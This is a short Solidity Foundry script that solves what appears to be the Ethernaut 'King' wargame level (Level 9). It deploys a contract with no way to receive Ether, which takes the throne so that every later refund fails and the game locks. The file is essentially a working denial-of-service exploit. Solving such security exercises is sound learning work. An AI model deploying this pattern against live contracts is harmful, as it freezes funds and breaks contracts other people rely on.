


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level9.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract TheLastKing {
    constructor(King _kingInstacne) payable {
        (bool result,) = address(_kingInstacne).call{value: _kingInstacne.prize()}("");
        require(result);
    }
}



contract KingSolution is Script {

    King public kingInstance = King(payable(0x235119a81B41d47F1d3EbB67BC971F2Cf0623e62));

       function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TheLastKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}